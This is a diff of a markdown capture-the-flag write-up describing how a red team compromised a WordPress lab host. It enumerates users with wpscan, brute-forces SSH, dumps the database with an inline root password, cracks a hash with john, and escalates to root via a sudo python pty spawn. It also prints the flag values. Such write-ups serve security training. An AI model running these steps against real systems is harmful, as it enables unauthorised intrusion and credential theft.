@@ -32,14 +32,13 @@ The following vulnerabilities were identified on each target:
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 
-`flag1`: b9bbcb33ellb80be759c4e844862482d
+### `flag1`: b9bbcb33ellb80be759c4e844862482d
 
 #### Exploits Used 
   - WPscan to enumerate users on Target 1
   - Brute force attacking a weak password
       
 #### Method
-
 First we enumerated the user accounts by exploiting the vulnerable WordPress site using wpscan.
 ```
 $ wpscan --url http://192.168.1.110/wordpress -e u
@@ -78,36 +77,71 @@ $ ssh michael@192.168.1.110
 $ grep -rnw / -e “flag1” 2> /dev/null
 ```
 
-`flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
+### `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c
 
 #### Exploit Used
   - Same exploit used to obtain flag 1
 
 #### Method
+Using the existing access we were able to locate the second flag using the following command:
 ```
 $ find / -iname “flag2*” 2> /dev/null
 ```
-`cat /var/www/flag2.txt`
+```
+cat /var/www/flag2.txt
+```
 
+### `flag3`: afc01ab56b50591e7dccf93122770cd2
 
-  - `flag3`: afc01ab56b50591e7dccf93122770cd2
-    - **Exploit Used**
-      - Same exploit used to obtain flag 1
-   - Commands:
-`$ cat /var/www/html/wordpress/wp-config.php`
-
-`$ mysqldump wordpress -u root -pR@v3nSecurity > dump`
-`$ grep “flag3” dump`
-
+#### Exploit Used
+  - Same exploit used to obtain flag 1
+#### Method
+```
+$ cat /var/www/html/wordpress/wp-config.php
+```
+```
+$ mysqldump wordpress -u root -pR@v3nSecurity > dump
+```
+```
+$ grep “flag3” dump
+```
 
 Note: flag4 is located here as well
 
-  - `flag4`: 715dea6c055b9fe3337544932f2941ce
-    - **Exploit Used**
-      - Same exploit used to obtain flag 1
-   - Commands:
-`$ mysql wordpress --user=root -pR@v3nSecurity`
-`>  `
+### `flag4`: 715dea6c055b9fe3337544932f2941ce
+
+#### Exploit Used
+  - Unsalted user password hashes in WordPress database
+  - Misconfiguration of user privileges leading to privilege escalation
+
+#### Method
+```
+$ mysql wordpress --user=root -pR@v3nSecurity
+```
+```
+>  select * from wp_users;
+```
+```
+exit
+```
+```
+echo "steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
+```
+```
+john hash.txt
+```
+```
+exit
+```
+```
+ssh steven@192.168.1.110
+```
+```
+sudo -l
+```
+```
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
 
 
